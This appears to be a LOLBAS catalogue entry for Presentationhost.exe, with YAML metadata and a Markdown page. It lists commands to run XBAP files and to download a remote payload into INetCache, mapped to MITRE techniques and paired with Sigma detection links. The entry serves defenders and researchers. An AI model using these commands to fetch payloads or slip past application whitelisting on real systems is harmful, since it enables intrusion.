---
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
- Person: Nir Chako (Pente
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: Presentationhost.exe {PATH_ABSOLUTE:.xbap}
  Description: Executes the target XAML Browser Application (XBAP) file
  MitreID: T1218
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  Privileges: User
  Tags:
  - Execute: XBAP
  Usecase: Execute code within XBAP files
- Category: Download
  Command: Presentationhost.exe {REMOTEURL}
  Description: It will download a remote payload and place it in INetCache.
  MitreID: T1105
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Downloads payload from remote server
Created: 2018-05-25
Description: File is used for executing Browser applications
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost_download.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost.yml
- IOC: Execution of .xbap files may not be common on production workstations
Full_Path:
- Path: C:\Windows\System32\Presentationhost.exe
- Path: C:\Windows\SysWOW64\Presentationhost.exe
Name: Presentationhost.exe
Resources:
- Link: https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
- Link: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
mitre_data:
  technique_ids:
  - T1218
  - T1105
tags:
- lolbas/osbinaries
---

# Presentationhost.exe

File is used for executing Browser applications

# Path(s)

- `C:\Windows\System32\Presentationhost.exe`
- `C:\Windows\SysWOW64\Presentationhost.exe`

# Download Commands

It will download a remote payload and place it in INetCache.

```batch
Presentationhost.exe {REMOTEURL}
```

- **Usecase:** Downloads payload from remote server
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Execute Commands

Executes the target XAML Browser Application (XBAP) file

```batch
Presentationhost.exe {PATH_ABSOLUTE:.xbap}
```

- **Usecase:** Execute code within XBAP files
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10



# Resource(s)

- https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
- https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Casey Smith (@subtee)
- Nir Chako (Pente